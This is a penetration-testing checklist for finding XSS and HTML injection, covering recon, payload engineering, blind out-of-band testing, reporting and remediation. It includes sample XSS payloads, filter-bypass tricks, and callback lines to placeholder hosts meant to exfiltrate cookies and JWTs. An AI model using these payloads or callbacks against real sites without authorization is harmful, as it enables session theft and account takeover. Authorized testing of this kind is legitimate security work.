# Advanced XSS & HTML Injection Hunting — Consolidated Checklists

A single, compact list of checklists to guide advanced hunting for HTML injection and XSS in engagements or CTFs. Use it step-by-step and iterate where needed.

---

## Preparation
- [ ] Define scope, allowed test windows, and authentication requirements.
- [ ] Prepare tools: Burp Suite (+ extensions), browser devtools, proxy, repeater, nuclei/ffuf, OOB listener (Burp Collaborator / xss.report).
- [ ] Create unique OOB identifiers for each test case.
- [ ] Configure browser for testing (console logging, Wappalyzer, JS beautifier).
- [ ] Create a notation scheme for findings (e.g., `TGT-01-stored-xss-bio`).

---

## Recon — Deep Discovery
- [ ] Enumerate subdomains (crt.sh, amass) and note environment variants (dev, staging, api).
- [ ] Crawl pages (auth + unauth) to map endpoints, forms, uploads, and APIs.
- [ ] Download all JS assets and bundles for offline analysis.
- [ ] Enumerate parameters: query, path, JSON keys, headers, cookies, localStorage keys.
- [ ] Locate admin/support/feedback endpoints and file upload endpoints.
- [ ] Record security headers (CSP, X-XSS-Protection, Referrer-Policy).

---

## Static Analysis — Code & Response Review
- [ ] Search JS for dangerous APIs: `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `insertAdjacentHTML`, `location.hash`, `location.search`.
- [ ] Map data flows: which parameters reach which sinks (source → transform → sink).
- [ ] Identify custom sanitizers or partial encodings and note their behavior.
- [ ] Inspect server responses for direct reflections into HTML, attributes, JS strings, JSON values, and headers.
- [ ] Check for `eval()` or unsafe JSON handling on the client-side.

---

## Dynamic Testing — Contextual Probing
- [ ] Probe each parameter with single special characters (`<`, `>`, `"`, `'`, `` ` ``, `\`, `/`, `&`) to determine encoding.
- [ ] Test contexts separately: element text, attributes, JS strings, URL path segments, and JSON bodies.
- [ ] For attributes: test `"`/`'` breakout payloads and on* handlers (e.g., `\" onmouseover=alert(1) x=\"`).
- [ ] For JS contexts: test `');alert(1);//`, template literal escapes, and numeric concatenations.
- [ ] Intercept and edit hidden/select values or JSON POSTs via proxy for deeper testing.

---

## DOM & Client-Side Testing
- [ ] Set DOM breakpoints on `innerHTML`, `appendChild`, `setAttribute` to capture runtime insertions.
- [ ] Inject markers into `location.hash`, `location.search`, `localStorage`, and `sessionStorage` and observe changes.
- [ ] Test single-page-app flows (search, pagination, filters) to trigger dynamic rendering.
- [ ] Prettify/minify JS bundles and set breakpoints where sources are consumed.
- [ ] Use `MutationObserver` or DOM mutation breakpoints to detect noisy dynamic insertions.

---

## Automated Fuzzing & Enumeration
- [ ] Fuzz discovered parameters with context-aware payload lists (DOM, attribute, script payloads).
- [ ] Place payloads in query, path, JSON body, headers, cookies, and file metadata (filenames).
- [ ] Try recursive encodings (URL encode, double encode, UTF-7/UTF-16) to probe WAF quirks.
- [ ] Manually validate automated positives with DOM inspection and console logs.

---

## Payload Engineering & Bypasses
- [ ] Start with minimal POC payloads (non-noisy): `<svg onload=alert(1)>` or `<img src=x onerror=alert(1)>`.
- [ ] Use obfuscation: broken tag nesting, comments, `[]['constructor']('alert(1)')()` and `new Function()` tricks.
- [ ] Try alternate encodings: `\uXXXX`, percent-encoding, base64 data URIs.
- [ ] Break out of contexts by closing tags/attributes: `</div><svg onload=...>`.
- [ ] Try uncommon handlers (`onpointerover`, `onfocus`, `onmouseenter`) and `srcdoc`/`iframe`/`data:` URIs.
- [ ] Test JSON eval scenarios and escaped quote strategies for `eval()` usage on client-side.

---

## Blind XSS & Out-of-Band (OOB) Testing
- [ ] Use unique OOB endpoints: `fetch('https://<unique>.oob/?id=UID')` or `<script src="https://<unique>.oob/">`.
- [ ] Monitor OOB services (xss.report, Burp Collaborator) and include UID markers in payloads for mapping.
- [ ] Test fields that reach admin UIs, ticket systems, or email templates (contact forms, feedback, logs).
- [ ] Use low-noise callbacks for stealthy confirmation (e.g., `new Image().src='https://<oob>/<uid>'`).

---

## Exploitation, Escalation & Impact Demonstration
- [ ] Evaluate impact: session theft, DOM‑CSRF, keystroke capture, user impersonation, admin takeover.
- [ ] Combine with other issues: CSRF, SSRF, open redirect, file upload vulnerabilities.
- [ ] Attempt exfiltration of cookies/JWTs via OOB and demonstrate real impact with captured artifacts.
- [ ] Test persistence across sessions, browsers (Chrome/Firefox), and user roles.
- [ ] Assess possible mass‑impact vectors (search result pages, forums, feeds).

---

## Validation & False‑Positive Reduction
- [ ] Reproduce findings manually across different browsers and clean profiles.
- [ ] Confirm context and show exact execution path (source → sink) in evidence.
- [ ] Verify payloads execute when input comes from other vectors (headers, cookies, path).
- [ ] Confirm OOB captures include expected artifacts (cookie, UA, referer) to prove execution.

---

## Reporting Checklist
- [ ] Concise title and affected component (e.g., `Stored XSS in ticket_description (admin view)`).  
- [ ] Affected endpoints with HTTP method and exact request sample.  
- [ ] Exact payload used and explanation of injection context.  
- [ ] Proof (screenshots, console logs, OOB evidence with timestamps).  
- [ ] Impact analysis and real‑world examples.  
- [ ] Reproduction steps (clear, numbered).  
- [ ] Remediation guidance (contextual escaping, `textContent` vs `innerHTML`, avoid `eval()`, CSP suggestions).  
- [ ] Severity rating and recommended immediate mitigations.

---

## Post‑Engagement & Hygiene
- [ ] Revoke/rotate any test credentials and OOB endpoints you control.
- [ ] Sanitize saved POCs and archive with reproduction notes.
- [ ] Update internal payload lists and tooling configs with new bypasses found.
- [ ] Document lessons learned and add target‑specific rules for future hunts.

---

## Advanced Shortcuts & Notes
- [ ] Prioritize endpoints that accept rich HTML input (WYSIWYG, profile bios, product descriptions).
- [ ] Track framework‑specific quirks (Angular sandbox escapes, legacy PHP `PHP_SELF` reflection).
- [ ] Automate repetitive checks but always manually verify context‑sensitive results.
- [ ] Keep a short library of environment‑specific bypasses and WAF quirks for quick reuse.

---

> Keep this single checklist as a living reference — add team‑ or company‑specific rules and a curated, prioritized payload list for efficient hunting.
